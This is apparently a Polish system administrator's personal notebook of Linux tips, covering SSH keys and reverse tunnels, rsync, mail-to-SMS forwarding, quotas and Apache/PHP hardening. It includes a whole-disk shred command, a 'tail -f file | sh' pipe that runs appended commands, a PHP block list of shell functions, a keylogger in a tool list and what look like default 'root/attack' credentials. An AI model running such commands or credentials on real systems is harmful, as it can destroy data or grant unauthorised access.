Polecenie loguje nas przez ssh, wykonuje na zdalnej polecenie odpalenia sesji screena na prawach superu¿ytkownika.
Parametry screena:

-d -RR - Pod³¹cz na nowo sesjê, a jeli to konieczne, od³¹cz j¹ lub utwórz. U¿yj pierwszej sesji jeli dostêpnych jest wiêcej ni¿ jedna.


2. Odpalanie programu konsolowego na zdalnej maszynie.
Wykonujemy po prostu polecenie:
ssh -t user@host "mtr www.google.pl"


W obu przypadkach czy po od³¹czeniu sesji screen'a czy po zakoñczeniu mtr, zakoñczy siê róznie¿ sesja ssh. Paramter polecenia ssh "-t" niejako przypina program do naszego lokalnego terminala, tak mi siê wydaje :)


NP.:czy mam w systemie rotkity

Jak sprawdzi? czy nie ma w systemie rootkitów?

jest do tego kilka narz?dzi oto namiary:

rkdet - http://vancouver-webpages.com/rkdet/
rscan - http://www.hsc.fr&ressources/outils/rkscan
saint jude - http://sourceforge.net/projects/stjude/
rootkithunter - http://www.rootkit.nl/projects/rootkit_hunter.html
chkrootkit - http://www.chkrootkit.org/

NP.:sciaganie calych stron wget
I rozpoczynamy sciagnie wybranej stronki
wget -r -k <zrodlowy_url>

-r zgrywaj rekurencyjnie (caly katalog wraz z jego zawartoscia)
-k utworz kopie zdolna do otwarcia offline (bez ponownego laczenia sie z internetem)

Pamietajmy ze nie wszystkie strony da sie w taki sposob sciagnac gdzy moga byc zabezpieczone przed takim procederem.

NP.:Nazwy kompow w otoczeniu secioym
nbtscan 10.10.10.2-100

NP.:Drukowanie przez udostêpnion¹ drukarkê na Windows

Opis jak skonfigurowac nasz system do korzystania z udostepnionej drukarki na Windows


2. Zbieranie informacji
Wyci¹gniemy trochê informacji o udostêpnionej drukarce
$ smbclient -L caparz0 -N

Zamiast caparz0 podajemy nazwê NetBIOS komputera, który udostêpnia drukarkê. Je¿eli mamy problem z odczytaniem informacji tylko po samym NetBIOS, mo¿emy po³¹czyæ siê dodaj¹c IP komputera, s³u¿y do tego prze³¹cznik -I:
$ smbclient -I 192.168.1.2 -L caparz0 -N




-----
Pakiet SSH pozwala zarówno na zdalne logowanie bez potrzeby podawania has³a oraz zdalne wykonywanie poleceñ z uprawnieniami odpowiedniego u¿ytkownika. Nie jest to skomplikowane zadanie. Jak zrealizowaæ logowanie bez podawania has³a? Przedstawiamy kolejne kroki:

1. Generujemy klucz publiczny / prywatny wykonuj¹c polecenie ssh-keygen.

Linux#ssh-keygen -t rsa

Generating public/private rsa key pair.

Enter file in which to save the key (/root/.ssh/id_rsa):

Enter passphrase (empty for no passphrase):

Enter same passphrase again:

Your identification has been saved in /root/.ssh/id_rsa.

Your public key has been saved in /root/.ssh/id_rsa.pub.

The key fingerprint is:

67:00:86:00:64:00:53:00:d7:00:40:00:b9:00:85:00 root@linux

Polecenie ssh-keygen wygenerowa³o dwa pliki. Pierwszy o nazwie "id_rsa" zawiera klucz prywatny, który nie mo¿e byæ nikomu udostêpniany. Drugi o nazwie "id_rsa.pub" zawiera klucz publiczny, który wysy³amy na dowolny serwer z którym zamierzamy ustanowiæ po³¹czenie.

2. Na tym etapie wykorzystamy mo¿liwoæ przesy³ania plików na zdalne serwery przy wykorzystaniu polecenia SCP. Ten krok nadal wymaga podania has³a.

Linux#scp /root/.ssh/id_rsa.pub root@zdalny_host:~/id_rsa.pub

Warning: Permanently added 'zdalny_host' (RSA) to the list of known hosts.

root@zdalny_host's password:

id_rsa.pub 100% 391 0.4KB/s 00:00

Na zdalny serwer do katalogu domowego u¿ytkownika root zosta³ skopiowany plik id_rsa.pub zawieraj¹cy wygenerowany klucz publiczny.

3. Logujemy siê na zdalny serwer przez wykonanie polecenia:

Linux#ssh root@zdalny_host

Podajemy has³o i zak³adamy na zdalnym serwerze katalog:

zdalny_host#mkdir /root/.ssh

Prawa dostêpu do tego katalogu powinny zostaæ ustawione na 700.

Nastêpnie dodajemy wygenerowany klucz do autoryzowanych na danym serwerze:

zdalny_host:~# cat ~/id_rsa.pub >> ~/.ssh/authorized_keys


Od tej pory mamy mo¿liwoæ logowania siê bez has³a do zdalnego serwera.

Za pomoc¹ SSH mo¿na przeprowadziæ kilka innych interesuj¹cych operacji. Podstawow¹ operacj¹ jest zdalny i szyfrowany dostêp do serwerów. SSH jest tak¿e czêsto wykorzystywane do przesy³ania plików na zdalny serwer:

Linux#scp lokalny_plik zdalny_serwer:/katalog/

Przedstawione polecenie kopiuje lokalny plik do okrelonego katalogu na zdalnym serwerze.

Istnieje tak¿e mo¿liwoæ transmisji w drug¹ stronê:

Linux#scp -r zdalny_serwer:/katalog/plik /lokalny_katalog/


Przedstawione polecenie kopiuje plik na zdalnym serwerze do okrelonego katalogu na lokalnym serwerze.

Niezwykle ciekaw¹ opcj¹ jest mo¿liwoæ zdalnego wykonywania poleceñ:

Linux#ssh nazwa_serwera "polecenie"

Dziêki podobnej sk³adni jestemy w stanie w bezpieczny sposób wykonaæ polecenie na zdalnym serwerze z uprawnieniami dowolnego u¿ytkownika. Przedstawiony proces umo¿liwi wykonywanie poleceñ bez potrzeby podawania has³a.

--------

Chcę porównać pliki lokalne ze zdalnymi, mam do dyspozycji  bash'a z
wykorzystaniem ssh do połączenia zdalnego. Chcę uzyskać listę plików które
mają różnicę w wielkości i dacie zmian. Rsync próbowałem zmusić do
stworzenia listy plików które będzie 'aktualizował' ale z opcją
--list-only zwraca mi wszystkie pliki. może coś robię źle?

Do końca nie wiem jak się za to zabrać. ssh user@host "ls -la /test" >
zdalna_lista ls -la /test > lokalna_lista

ssh komp "find /home/test -type f -printf '%p %s %T@\n'" | sort > lista.1
find  /home/test -type f -printf '%p %s %T@\n' | sort > lista.2 diff
lista.1 lista.2 | grep ">" | awk '{ print $2 }'

-----------------------



gftp
rar
thunderbird
k3b
vlc - video lan
revelation - graphical password menager
tasks
uberkey - Keylogger  
denyhosts -  Scan ssh server logs and block hosts  

skype
ntfs
fuse
adobe acrobat
real player

kcheckgmail
nagios -   monitoring network program
nettop

compiz aiglx

----------------

yum -y install wireshark wireshark-gnome - siec

oracle - duzo nalez sie napracowac, nie spelnilem wszystkich wymagan. Szybko zainstalowac w pracy celem utrwalenia prktyki.


netstat -tup
netstat -tulp

gnokii
gammu

yum install vsftpd

snort 
mysql
apache - httpd
php


------------



 ClusterSSH: kontroluj wiele po³¹czeñ SSH
 
butelka
kazik


Ustawiæ zegar na UCT: w zimie jest to czas Polski - 1 godzina, w lecie czas Polski - 2 godziny. Czas letni zaczyna siê w nocy z ostatniej soboty na niedzielê w marcu, a czas zimowy zaczyna siê w nocy z ostatniej soboty na niedzielê w padzierniku.

- ksiegarnia i ksi¹¿ki

Onyszkiewicz
dzambel


root
attack

netrangr
attack


kopiowanie pliki/foldery ze zdalnego komputera do komputera lokalnego (scp)

scp -r nazwa_u¿ytkownika@192.168.0.1:/home/username/zdalnyplik.txt

skopiowaæ pliki z lokalnego komputera na zdaln¹ maszynê (scp)

scp -r pliklokalny.txt nazwau¿ytkownika@192.168.0.1:/home/username/






tcpdump -ennqti eth0 \( arp or icmp \)

tcpdump -c 3 -nni eth2 arp

iptraf - badanie obci¹zenia l¹cza


7.16.1. Tunel zwrotny SSH

MASZYNA 1 za NAT
ssh rtl@193.19.73.202 -R 6666:localhost:3389

MASZYNA 2 - 193.19.73.202
tsclient -p 6666

--

MASZYNA 3
ssh -L 7777:localhost:6666 rtl@193.19.73.202

z Windows
tsclient localhost:7777



Czêsto jest potrzeba do dostania siê maszyny "schowanej" za bramk¹ internetow¹. W przypadku rozwi¹zañ typu NAT lub Masquarading, bezporednie po³¹czenie siê ze schowanym komputerem z zewn¹trz nie jest mo¿liwe. Mo¿liwa jest natomiast inicjalizacja po³¹czenia ssh z docelowego komputera i zalogowanie siê na niego przez tak zwany tunel zwrotny.

Tunel ten tworzymy wywo³uj¹c na docelowym komputerze nastêpuj¹ce polecenie:

ssh user@server -R 7777:localhost:22

Podany numer portu - 7777 - jest przyk³adowy. Mo¿e byæ to dowolny numer portu nieu¿ywany na komputerze server. Takie polecenie spowoduje utworzenie tunelu zwrotnego - na docelowy komputer mo¿na siê zalogowaæ z komputera server przez wydanie polecenia:

ssh localhost -p 7777

Je¿eli tunel ma byæ aktywny przez d³u¿szy czas, warto uruchamiaj¹c tunel podaæ dodatkowe polecenie, którego aktywnoæ zabezpieczy przez zerwaniem po³¹czenia uznanego za nieu¿ywane. Przyk³adowo:

ssh user@server -R 7777:localhost:22 "/bin/sh -c 'while true; do sleep 5; \
echo +; done'"

Jeszcze lepszym rozwi¹zaniem jest u¿ycie programu autossh (w Debianie paczka o takiej samej nazwie). Program ten pozwala na uruchomienie tunelu z wykorzystaniem dodatkowego portu monitoruj¹cego - zerwane lub zablokowane po³¹czenia s¹ automatycznie wznawiane. Przyk³adowe wywo³anie autossh mog³oby wygl¹daæ nastêpuj¹co:

autossh -fN -M 7778 -R 7777:localhost:22 user@server

Opcja -f powoduje przejcie autossh w t³o, opcja -N jest przekazywana do ssh - zakazuje wykonywania komend - tylko przekierowywanie portów (zwiêksza to bezpieczeñstwo). Numer portu do monitorowania, tu przyk³adowo 7778, mo¿e byæ równie¿ dowolny, ale unikalny.

Oczywicie pozostaje problem, jak na docelowym komputerze, który jest niedostêpny, uruchomiæ tunel. Mo¿emy podyktowaæ odpowiednie polecenie przez telefon, ale na d³u¿sz¹ metê warto dodaæ albo odpowiednie wywo³anie ssh np. do crontaba, albo uruchomienie autossh przez skrypty startowe systemu. 

------------------




Uruchamia komentdy z pliku dopisywane dynamicznie
>tail -f plik | sh & 

yum install aide - How do I check the software integrity

From camera to website: Building an open source
http://www.redhatmagazine.com/2008/04/24/from-camera-to-website-building-an-open-source-video-streamer/

yum install dvgrab
yum install pitivi gstreamer-plugins-good.


How do I resize multiple image files using command-line tools?

yum install ImageMagick

After installing ImageMagick package, use mogrify to resize multiple image files. See example command below in resizing all JPG photos in the current working directory to 640 pixels in width while maintaining its original aspect ratio:

mogrify -resize 640 *.jpg

To resize the resolution of all JPG image files to exactly 640 pixels in width and 480 pixels in height, use:

mogrify -resize 640x480! *.jpg

Tips and tricks: How can I configure squid so that it never caches some web sites?
by the editorial team

Add the following line in /etc/squid/squid.conf:

acl NOCACHEDOMAIN dstdomain www.redhat.com
no_cache deny NOCACHEDOMAIN

It will not cache any content come from the domain www.redhat.com.

In /var/log/squid/access.log, it will show the page from that domain will always get "TCP_MISS" on consecutive visits.

Tips and tricks: How do I enable xdmcp in Red Hat Enterprise Linux 5?
by the editorial team

In Red Hat® Enterprise Linux® 4 and below the file /etc/X11/gdm/gdm.conf could be modified to enable xdmcp. With Red Hat Enterprise Linux 5, the location to enable xdmcp has changed.

There are two ways that xdmcp can be enabled:

* Modify the file /etc/gdm/custom.conf and under the [xdmcp] section, add this line:

      Enable=true

    * Alternately, the tool gdmsetup can be used. This is a gui-based tool to modify gdm. 

Once one of these two steps are done - simply run gdm-restart and then
login as desired user.


kasowanie dysku
shred -v -n 7 -z /dev/[sh]da 

backup MBR
dd if=/dev/sda of=/plik/z/backupem/mbr bs=512 count=1

sprawdzenie MX'a
host -t MX rafalkobe.pl

zapisywanie sesji
screen -L

iftop
iptraf
netwatch



masz tutaj skrypcik który robi screena (skaluje do 640x480) i wysy³a go na maila:

http://deimos.org.pl/sendwa.zip

musisz
1:mieæ zainstalowanego python-a oraz programik "import" (powinien byæ od razu)
2:wyedytowaæ ten skrypt i wpisaæ do niego twoje ustawienia (adres email, serwer poczty, konto, has³o)
3.utworzyæ katalog /root/report, /root/report/images
4.napisaæ skrypt (albo rozwin¹æ ten) który najpierw utworzy plik /root/report/index.txt ze wszystkimi monitorowanymi parametrami jakie chcesz (zostawiam to twojej inwencji), jesli nie chcesz tego robic to stwórz przynajmniej ten plik pusty albo z jakim tekstem inaczej mail siê nie wyle
5:jak chcesz ¿eby odapala³ siê cyklicznie - musisz go wrzuciæ do cron-a 


blokowanie hostów po nieudanym logowaniu
fail2ban, sshguard, denyhosts
 

Informacja o tym, że ktoś zalogował się jako root

Co, gdy ktoś zaloguję się na konto super użytkownika za naszymi plecami ? Spowodujmy, abyśmy byli informowani o każdym logowaniu na roota.
Jak?

   1. Otwórz plik .bashrc znajdujący się w katalogu /root
   2. Dodaj linijkę “echo ‘Uwaga - Logowanie na konto Root (Nazwa serwera) :’ `date` `who` | mail -s “Uwaga - zalogowanie na konto roota`who | cut -d”(” -f2 | cut -d”)” -f1`” twój@email.pl“
   3. Zapisz plik


echo 'Zalogowanie' | mail  -s 'Uwaga-zalogowanie na konto Root(bieszczady)' user@localhost


------------------------------

Używanie odpowiedniej wiadomości powitalnej

Musisz poinformować każdego, kto będzie próbował zalogować się do systemu o tym, co robi i oznajmić mu, że ten system nie jest dostępny dla każdego (publiczny). Kiedyś doszło do włamania do systemu, który nie używał takiej informacji, w wyniku czego sąd uniewinnił włamywacza, powitanego przy próbie zalogowania wiadomością “Welcome” ;).
Jak?

   1. Usuń plik /etc/redhat-release
   2. Otwórz plik /etc/issue oraz /etc/motd i zamieść w nich poniższą informację :

    Ten komputer jest dostępny tylko dla autoryzowanych użytkowników. Próby użycia tego systemu bez autoryzacji i/lub wszelkie nadużycia są monitorowane i zapisywane i/lub analizowane przez odpowiednie osoby, włączając w to instytucje rządowe. Działalność autoryzowanych użytkowników również może być monitorowana i rejestrowana. Wszystkie zarejestrowane i zapisane materiały mogą być przekazane odpowiednim służbom. Używając tego systemu zgadzasz się na powyższe warunki.

------------------------------

Ukrywanie informacji o Apache

Powinieneś wyłączyć informacje o wersji serwera Apache, co spowoduje, że włamywacz, czy też skrypt skanujący system w poszukiwaniu dziur, nie będzie wiedział jakiej wersji Apache używasz — utrudni mu to pracę.
Jak?

   1. Otwórz plik /etc/httpd/conf/httpd.conf
   2. Zmień linię “ServerSignature” na “ServerSignature Off”, oraz linię “ServerTokens” na “ServerTokens Prod”
   3. Zapisz plik
   4. Zrestartuj Apache: /sbin/service httpd restart

Ukrywanie informacji o PHP

Poza “uciszeniem” Apache powinniśmy wyłączyć informację o wersji PHP.
Jak?

Otwórz plik php.ini

Zamień linię “expose_php” na “expose_php=Off”


Wyłączanie niebezpiecznych funkcji PHP

Powinieneś wyłączyć niebezpieczne funkcje PHP, ponieważ pozwalają np. na wykonywanie poleceń w powłoce.
Jak?

Zlokalizuj twój plik php.ini i otwórz go do edycji:

    * whereis php.ini
    * Otwórz plik znajdujący się w ścieżce podanej przez wheris
    * Zamień linię disable_functions = “” na disable_functions = “symlink, shell_exec, exec, proc_close, proc_open, popen, system, dl, passthru, escapeshellarg, escapeshellcmd”



--------------------------------


What it is virbr0? How can I disable or remove virbr0?

yum groupremove "Virtualization"



----------------------


Szukanie otwartych portów

Znalezienie otwartych i nie używanych portów jest bardzo ważne, ponieważ każdy niepotrzebnie otwarty port może stanowić furtkę dla włamywacza.
Jak?

Aby uzyskać listę otwartych portów możesz użyć poniższych komend:

   1. netstat -tulp
   2. lsof -i -n | egrep ‘COMMAND|LISTEN|UDP’

----------------------------

Access Your MySQL Server Remotely Over SSH

ssh -L 3306:localhost:3306 geek@webserver.com


-----------------


xrestop - X11
ntop - localhost:3000 - sieciówki
apachetop
ptop
dnstop
iftop
mytop
powertop
atop
htop


-----------


italc - nażędzie dla nauczyciela


----------------------

rsync

    * a [archive] - to multi-parametr przekazujący wiele opcji jak działanie rekursywne, zachowywanie linków, uprawnień, czasów, itd. Jest to podstawowy parametr rsynca,
    * u [update] - ten parametr pozwala nam zachować w niezmienionej postaci pliki które są nowsze na synchronizowanym komputerze. W tym momencie istotną kwestią staje się synchronizacja czasu naszych komputerów. Warto pomyśleć o własnym serwerze ntp lub choćby korzystaniu z tego samego serwera publicznego na wszystkich komputerach w sieci,
    * v [verbose] - z tym parametrem program robi się bardziej gadatliwy. Można zmusić go do jeszcze większej gadatliwości poprzez zwielokrotnienie tego parametru, przy (-vvv) co jest wartością maksymalna nasz program staje się aż nadto wylewny,
    * h [human-readable] - przedstawia nam dane w czytelnej dla nas postaci,
    * z - jest parametrem odpowiedzialnym za kompresje danych podczas transferu co może być szczególnie istotne w wypadku rozbudowanych sieci komputerowych,
    * e ssh - tym parametrem przekazujemy rsyncowi z jakiej zdalnej konsoli mamy zamiar skorzystać. W naszym wypadku SSH,
    * progress - dzięki temu parametrowi widzimy w którym etapie synchronizacji właśnie się znajdujemy,
    * exclude=[maska] - tutaj możemy wykluczyć grupę plików których nie chcemy przenosić, co jest bardzo użyteczne do blokowania transferu plików tymczasowych,
    * delete - użycie tej opcji musi zostać szczególnie przemyślane, gdyż nieodpowiednie jej użycie może pozbawić nas plików które chcielibyśmy zachować. W założeniu dzięki tej opcji z katalogu synchronizowanego zostaną skasowane pliki/katalogi, których nie ma w katalogu synchronizującym(źródle).


ssh-keygen -t rsa
ssh-copy-id -i ~/.ssh/id_rsa.pub user@host

lokalny na zdalny
rsync --progress -auvhze ssh ~/TEST/ user@192.168.1.129:~/BACKUP/

zdalny na lokalny
rsync --verbose --progress --stats --recursive --times --perms --links --compress --rsh=ssh user@192.168.1.129:~/BACKUP/ ~/TEST/
	
	
------------


cms

pluck
skybluecanvas
nonocms
frogcms
jomla
chyrp
wordpress


------

zmiana wielkosci partycji root / lvm


telinit - change run level (możemy też zrestartować partycję przekazująć parameter init=/bin/bash)

lvresize -l+1G /dev/mapper/volGroup00-LogVol00
resize2fs


--------------

siege - statystyki serwera www

----
powiadomienia sms na komórkę


yum install smstools 

numer musi być z kierunkowym 48795559611

+48795559611

[root@bieszczady sms]# cat /etc/smsd.conf
# Example smsd.conf. Read the manual for a description

devices = GSM1
logfile = /var/log/smsd.log
loglevel = 7

[GSM1]
device = /dev/ttyUSB0
incoming = yes
#pin = 1111
incoming = yes
memory_start = 0
mode = new
baudrate = 19200
rtscts = yes
report = no



-konfigurujemy przekazywanie informacji o poczcie

.forward
| /usr/bin/procmail $HOME/.forward


.procmailrc

VERBOSE=on
LOGFILE=$HOME/mail/procmail.log

:0 c
* ^From*
| formail -X Subject: -X From: |mail -s "dupa" user@localhost < /dev/null

#:0 c
#| /bin/sh sss

#| smssend 48602417325 "alfa"

# włączenie logowanie
# LOGFILE=/home/ktos/logs/procmail.log
# ABSTRACT=no
# VERBOSE=no
#
# # potrzebne później
# TIME=`date +%H%M`
# ISGT=`expr ${TIME} \> 0900`
# ISLT=`expr ${TIME} \< 1900`
#
# # mantis-mamdom i automatyczny sposób zarządzania zgłoszeniami
# :0
# * ^to.*mantis-mamdom
# mantis-mamdom.mbox
#
# # całą kopię następnych mejli wrzucaj do pliku kopii zapasowej
# :0 c
# Backup.mbox
#
# # w momencie gdy jest to poczta od demonów i takich tam,
# # wrzuć do oddzielnego pliku
# :0 c
# * ^FROM_MAILER
# Daemons.mbox
#
# # specjalny adres administracyjny
# :0 c
# * ^To.*administrator@[ciach, pewna domena]
# Admin.mbox
#
# :0
# * ^Subject.*Undelivered.Mail.Returned.to.Sender
# Daemons.mbox
#
# :0
# * .*Postfix.*host.*[ciach, pewien host]
# Daemons.mbox
#
# # w momencie gdy jest to poczta zawierająca pewne slowa w
# # temacie wskazujace na spam to wyrzuc to oddzielnego
# # pliku i nie przekazuj dalej
# :0
# * ^Subject:.*free|^Subject:.*dick|^Subject:.*girl|^Subject:.*cheap|^Subject:.*f.ck|^Subject:.*adult
# Spam.mbox
#
# gdy jest to ważna poczta
# powiadom smsem jeżeli jest w godzinach 9-17
:0 c
#* ^From.*[ciach, nieistotne]|^To.*[ciach, prywatna wiadomość]
#* ^From.*
#* ISGT ?? ^^1^^
#* ISLT ?? ^^1^^
{
        SUBJECT=`formail -x Subject: | cut -c -50`
        :0
	| smssend 48602417325 "New mail: ${SUBJECT}"
}


# wszystko co się nie łapie, jest forwardowane na mój główny e-mail
:0



--PrzykŁady formail

Aby podzielić pierwsze streszczenie zwykle można użyć: formail +1 -ds >> twoja_skrzynka_pocztowa lub
formail +1 -ds procmail

Aby usunąć z nagłówka wszystkie pola Received: formail -I Received:

Aby usunąć z nagłówka wszystkie pola oprócz From: i Subject: formail -k -X From: -X Subject:

Aby zastąpić wszystkie pola Reply-To:
formail -i “Reply-To: foo@bar"

Aby zmienić niestandardową skrzynkę pocztową na standardową można użyć: formail -ds <stara_skrzynka >>nowa_skrzynka

Lub jeśli korzysta się z bardzo tolerancyjnego programu pocztowego: formail -a Date: -ds <stara_skrzynka >>nowa_skrzynka

Aby wyciągnąć nagłówek z wiadomości:
formail -X “"
lub
sed -e ‘/^$/ q’

Aby wyciągnąć treść wiadomości:
formail -I “"
lub
sed -e ‘1,/^$/ d’ 
--

Przekierowanie poczty na komórkę
Następnie w katalogu domowym użytkownika należy umieścić plik .procmailrc:

SHELL=/bin/sh
NEW_SUBJECT=`/usr/bin/formail -xSubject`
SMS_MAILADDR=`/usr/bin/formail -xReturn-Path`
NEW_BODY=`/usr/bin/formail -c | /usr/local/bin/mimecut`
SIZE=`/usr/bin/wc -c|/usr/bin/tr -d " "`
SMS=`/bin/echo "$SIZE $NEW_SUBJECT $NEW_BODY"|/usr/bin/tr -s " "`
:0 c
*
| /usr/bin/sms 502345678 $SMS



Następnie do /usr/local/bin rozpakowujemy plik /usr/share/doc/sms-pl/examples/mimecut.gz:

zcat /usr/share/doc/sms-pl/examples/mimecut.gz >/usr/local/bin/mimecut
chmod +x /usr/local/bin/mimecut


--

cat .fetchmailrc 
poll pop.gmail.com
	proto pop3
	port 995
	user "solaris.aix"
	pass "xxxxxxx"
	is red
	keep
	no fetchall
	ssl


fetchmail -v -f '/home/red/.fetchmailrc'
chmod 600 .fetchmailrc

30 0 * * * /usr/bin/fetchmail >/dev/null 2>&1


man procmailex



------------

linux telegazeta

mtt
alevt

- probram tv

http://wiki.xmltv.org/index.php/XmltvRelatedProjects

http://gshowtv.sourceforge.net/
gshowtv - program tv na podstawie plików xml

-------------

sloccount - zlicza liczę lini kodu oprogramowania

-- 

co blokuje odmontowanie partycji

lsof +D /mnt/Multimedia

-----------------------------

Konwersja obrazu z VMware do formatu VirtualBox

Przed rozpoczęciem konwertowania oczywiście zalecam stworzenie kopii zapadowej obrazu na wypadek błędów.

1) Na początek zainstalujemy narzędzie qemu-img wchodzące w skład QEMU. Wydajemy zatem polecenie:

    sudo apt-get install qemu

2) Następnie wydajemy polecenie, które zmieni format obrazu z vmdk na bin:

    qemu-img convert obraz_ubuntu.vmdk /tmp/obraz_ubuntu.bin

3) Na koniec musimy jeszcze tylko przy użyciu VBoxManage zmienić obraz .bin w natywny format Virtualboksa:

    VBoxManage convertdd /tmp/obraz_ubuntu.bin obraz_ubuntu.vdi

-------------------------------

freemind


----------------------------------

kompilacja

Kolejne polecenie sprawdzi czy w systemie są zainstalowane wszystkie potrzebne biblioteki i w razie czego poinformuje nas o problemach jakie mogą napotkać:

./configure
Załóżmy, że wszystko jest w porządku i przechodzimy do kompilacji programu (czasami bywa czasochłonna, to wszystko zależy od źródeł i komputera):

make
Jeśli kompilacja przebiegła bezbłędnie to pozostaje zainstalować daną aplikację:

sudo make install
To wszystko, jeśli wszystko przebiegło zgodnie z planem możemy zacząć korzystać z nowej wersji programu.

Aby odinstalować Gajima, pozostaje wykonać kilka prostych poleceń. Najpierw wchodzimy do katalogu z Gajimem, w którym kompilowaliśmy tego Gajima:

cd ~/gajim-0.12.1
Teraz wyklepujemy polecenie, które odinstaluje skompilowanego Gajima:

sudo make uninstall
Oraz:

sudo make clean

W tym momencie Gajim został całkowicie usunięty z naszego systemu.

Aha… po kompilacji programu, jeśli on nam dobrze działa i nic nie zamierzamy dalej robić, proponuję odinstalować pakiety, które były potrzebne do kompilacji, ponieważ po co mają niepotrzebnie zaśmiecać system:

sudo apt-get autoremove
Oraz:

sudo apt-get clean
Jak widać kompilowanie programów z źródeł nie jest wcale takie trudne (niektórzy tylko wyolbrzymiają ten trud). Wiadomo najłatwiej jest zainstalować paczkę klikając 2x myszką na *.deb ale niestety nie zawsze istnieje taka możliwość.



------------------

systemy kontroli wersji

CVS, SVN (zwany także Subversion), GIT, BitKeeper, SVK i wiele innych.

sudo apt-get install subversion
yum install mod_dav_svn
sudo svnadmin create /var/svn
sudo apt-get install libapache2-svn
sudo gedit /etc/apache2/mods-enabled/dav_svn.conf

---------

anonimowo w sieci

Steganos Internet Anonym 2006
tor 
hide my ip 2008
multiProxy
JAP

-----

identyfikacja systemu

p0f 
nmap 
dsniff
tcpdump

----------------------

mount -o loop -t iso9660 hakin9.iso /mnt

----


Podsumowanie zawodowe:

C/C++ on Windows and UNIX systems AIX, Solaris, Linux

C/C++ cross-compiler on UNIX systems
for gcc (x86_s390, x86_IA64, x86_ppc)
for VisualAge Aix_i5 in PASE mode.

C/C++ Windows
MSDN libraries
Windows services
Windows kernel-driver (WinDDK)
DLL libraries
JNI libraries

Creating installs pack
Windows – Install Shield
Linux – rpm
HP-UX
Solaris
AIX

Java technology:
J2SE, Swing, AWT, RMI, JNI
J2EE, JSP,Servlet, JavaScript,
XML, XSLT

Script language:
Python, Perl, bash, awk, sed

Database
Oracle, Progress4GL, DB2, SQL

Unix / Windows system Administration (about 40 physical and virtual machines)
AIX 5.1, 5.2, 5.3, 6.1
Solaris 8,9,10 Sparc and x86
HP-UX 11.11, 11.23 PARISC
Windows XP, 2003, Vista, 2008
RedHat 5
Suse 10

Build Environments Administration AIX, Solaris, Windows, Linux
System installation
User and group administration
SSH, telnet
SCP, FTP
XDMCP, VNC, Xserver
Firewall configuration on AIX, Solaris, Windows, Linux
File repository configuration CVS, SVN
LAN configuration AIX, HP-UX, Solaris, Windows, Linux
Webserver configuration (websphear, jboss, apache)
Java and C/C++ compiler installation and configuration

Knowledge about file repository, CVS, SVN, SourceSafe, ClearCase, CMVC

Knowledge about virtualizes technology
Vmware Server, ESX VMWare
AIX LPAR, WPAR
Solaris Zone
HP-UX nPars, vPars
Windows HyperV , VirtualServer

--------------

rożnice w plikach wykonywalnych

EBDS
bidiff
IDA

------------

quota

vi /etc/fstab 

/dev/VolGroup00/LogVol00 /                       ext3    defaults,usrquota,grpquota        1 1

touch /aquota.user /aquota.group
chmod 600 /aquota.*
mount -o remount /
quotacheck -avugm
quotaon -avug

Assigning Quotas per User

edquota username

Perform this step for each user for which you want to implement a quota. For example, if a quota is enabled in /etc/fstab for the /home partition (/dev/hda3) and the command edquota testuser is executed, the following is shown in the editor configured as the default for the system:

Disk quotas for user testuser (uid 501):
  Filesystem                   blocks       soft       hard     inodes     soft     hard
  /dev/hda3                    440436          0          0      37418        0        0

6.1.5. Assigning Quotas per Group

Quotas can also be assigned on a per-group basis. For example, to set a group quota for the devel group, use the command (the group must exist prior to setting the group quota):

edquota -g devel

This command displays the existing quota for the group in the text editor:

Disk quotas for group devel (gid 505):
  Filesystem                   blocks       soft       hard     inodes     soft     hard
  /dev/hda3                    440400          0          0      37418        0        0

"blocks in use" - jest całkowitą ilością bloków (w kilobajtach) jaką zużył dany użytkownik.
"inodes in use" - jest całkowitą liczbą plików jaką użytkownik ma na dysku.

    * Soft Limit.
      Normalnie, soft limit określa maksymalną objętość dysku, jaką użytkownik ma przyznaną. Ale jeśli połączymy to z grace period, to soft limit określa nam granicę, po przekroczeniu której użytkownik zostaje ostrzeżony.
    * Hard Limit.
      Działa to jedynie przy ustawieniu grace period. Określa to absolutny limit na dysku, którego dany użytkownik nie może przekroczyć.
    * Grace Period.
      Jest to okres czasu, po jakim zacznie działać opcja soft link. Wartości tej opcji podaje się poleceniem edquota -t. Jednostkami czasu mogą być: sekundy, minuty, godziny, dni, tygodnie lub miesiące. Oto co zobaczysz po wydaniu polecenia edquota -t:

             Time units may be: days, hours, minutes, or seconds
             Grace period before enforcing soft limits for users:
             /dev/hda2: block grace period: 0 days, file grace period: 0 days

      Zmień 0 days na jakiś okres czasu, który uważasz za słuszny. Osobiście wybrałbym 7 dni albo 1 tydzień.


-----------------------------------

Sprawdzenie adresu IP

Używając Wget

    wget -q -O - checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*$//'

Używając cURL

    curl -s checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*$//'

Uzywając Lynx

    lynx -dump checkip.dyndns.org

----

automatyczne wylogowanie z shella

export TMOUT=240

~/.bashrc

------------

skaner wyszukuje luki w aplikacjach webowych

ratproxy

ratproxy - v /tmp -w ratproxy.log -d domena.pl -lfsc
ratproxy - v /tmp -w ratproxy.log -d domena.gov.pl -lextifscgjm

ratproxy-report.sh ratporxy.log report.html


-----------------

bezpieczne korzystanie z internetu

adduser webuser
passwd webuser

xhost +SI:localuser:webuser

su -- webuser

firefox

tar -cvf webuser.tar /webuser

-
rm -rf /home/webuser

tar --xvf /home/webuser.tar --C /home/

------------

czytnik poczty
alpine 
mutt

czytnik rss

opml2snow rssfeeds.opml >> ~/.snownews/urls
snownews


-----------------

chattr - zmiana atrybutów plików na systemie plików ext2

SkŁadnia

chattr [ -RV ] [ -v wersja ] [ tryb ] pliki...

Opis

chattr zmienia atrybuty plików na drugim rozszerzonym systemie plików Linuksa (ext2).

Format w trybie symbolicznym ma postać +-=[ASacdistu].

Operator ,,+’’ powoduje dodanie wybranych atrybutów do istniejących; ,,-’’ powoduje ich usunięcie, a ,,=’’ powoduje, że stają się jednymi atrybutami jakie posiadają pliki.

Litery ,,ASacdijsu’’ oznaczają wybór nowych atrybutów dla plików: nie aktualizowanie atime (A), synchroniczna aktualizacja (S), tylko dopisywanie (a), kompresja (c), nie składowanie (no dump) (d), niezmienny (immutable) (i), dziennik danych (j), bezpieczne kasowanie (s), i niekasowalne (u).

Opcje

-R
    Rekurencyjna zmiana atrybutów katalogów i ich zawartości. Napotkane podczas obchodzenia katalogów dowiązania symboliczne są ignorowane.

-V
    Tryp rozwlekły komunikatów chattr oraz wypisanie wersji programu.

-v version
